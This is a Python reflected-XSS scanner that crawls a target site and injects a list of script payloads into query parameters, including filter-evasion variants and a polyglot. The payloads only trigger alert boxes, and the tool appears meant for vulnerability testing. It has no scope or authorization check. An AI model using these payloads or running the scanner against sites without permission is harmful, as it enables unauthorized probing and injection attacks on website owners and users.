#!/usr/bin/env python3
# D6V6L6 - Advanced XSS Vulnerability Scanner
# Developed by: Security Analyst

import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import threading
from queue import Queue
import time


class D6V6L6XSSScanner:
    def __init__(self, target_url, threads=10):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) D6V6L6-XSS-Scanner/1.0'
        })
        self.vulnerable_urls = []
        self.threads = threads
        self.queue = Queue()
        self.scanned_urls = set()

        # Comprehensive XSS payload list
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<scri%00pt>alert('XSS')</scri%00pt>",
            "<script>prompt('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "#javascript:alert('XSS')",
            "javascript://alert('XSS')",
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e"
        ]

    def is_valid_url(self, url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def extract_links(self, url):
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = []

            for link in soup.find_all(['a', 'form', 'iframe', 'script']):
                href = link.get('href') or link.get('src') or link.get('action')
                if href:
                    full_url = urljoin(url, href)
                    if self.is_valid_url(full_url) and self.target_url in full_url:
                        links.append(full_url)

            return links
        except:
            return []

    def test_xss(self, url, param, payload):
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            if param in query_params:
                original_value = query_params[param][0]
                test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")

                response = self.session.get(test_url, timeout=5)

                if payload in response.text and not any(
                        error in response.text.lower() for error in ['404', 'not found', 'error']):
                    if payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text:
                        return True
        except:
            pass
        return False

    def scan_url(self, url):
        if url in self.scanned_urls:
            return
        self.scanned_urls.add(url)

        print(f"[*] Scanning: {url}")

        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in params:
                for payload in self.xss_payloads:
                    if self.test_xss(url, param, payload):
                        result = {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'Reflected XSS'
                        }
                        self.vulnerable_urls.append(result)
                        print(f"[!] XSS Found: {url}?{param}={payload}")
                        break
        except Exception as e:
            print(f"[!] Error scanning {url}: {e}")

    def crawl_website(self):
        print("[*] Crawling website...")
        to_crawl = [self.target_url]
        crawled = set()

        while to_crawl:
            url = to_crawl.pop()
            if url in crawled:
                continue

            crawled.add(url)
            print(f"[*] Found: {url}")

            links = self.extract_links(url)
            for link in links:
                if link not in crawled and link not in to_crawl:
                    to_crawl.append(link)

            time.sleep(0.1)
        return list(crawled)

    def worker(self):
        while True:
            url = self.queue.get()
            if url is None:
                break
            self.scan_url(url)
            self.queue.task_done()

    def run_scan(self):
        print(f"[*] Starting XSS Scan on: {self.target_url}")
        print("[*] This may take a while...\n")

        all_urls = self.crawl_website()

        for url in all_urls:
            self.queue.put(url)

        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        self.queue.join()

        for _ in range(self.threads):
            self.queue.put(None)
        for thread in threads:
            thread.join()

        self.show_results()

    def show_results(self):
        print("\n" + "=" * 60)
        print("D6V6L6 XSS SCAN RESULTS")
        print("=" * 60)

        if not self.vulnerable_urls:
            print("[+] No XSS vulnerabilities found!")
            return

        print(f"[!] Found {len(self.vulnerable_urls)} XSS vulnerabilities:\n")

        for i, vuln in enumerate(self.vulnerable_urls, 1):
            print(f"{i}. URL: {vuln['url']}")
            print(f"   Parameter: {vuln['parameter']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Type: {vuln['type']}")
            print("-" * 40)


def main():
    parser = argparse.ArgumentParser(description='D6V6L6 - Advanced XSS Vulnerability Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', help='Output file for results')

    args = parser.parse_args()

    scanner = D6V6L6XSSScanner(args.target, args.threads)
    scanner.run_scan()

    if args.output:
        with open(args.output, 'w') as f:
            f.write("D6V6L6 XSS Scan Results\n")
            f.write("=" * 40 + "\n")
            for vuln in scanner.vulnerable_urls:
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Parameter: {vuln['parameter']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Type: {vuln['type']}\n")
                f.write("-" * 40 + "\n")
        print(f"\n[+] Results saved to: {args.output}")


if __name__ == "__main__":
    print("""
     ██████╗ ██████╗ ██╗   ██╗██╗ ██████╗ ██╗     
    ██╔═══██╗██╔══██╗██║   ██║██║██╔═══██╗██║     
    ██║   ██║██████╔╝██║   ██║██║██║   ██║██║     
    ██║   ██║██╔═══╝ ██║   ██║██║██║   ██║██║     
    ╚██████╔╝██║     ╚██████╔╝██║╚██████╔╝███████╗
     ╚═════╝ ╚═╝      ╚═════╝ ╚═╝ ╚═════╝ ╚══════╝
    D6V6L6 - Advanced XSS Vulnerability Scanner
    Version 1.0 | By Security Researcher
    """)

    main()
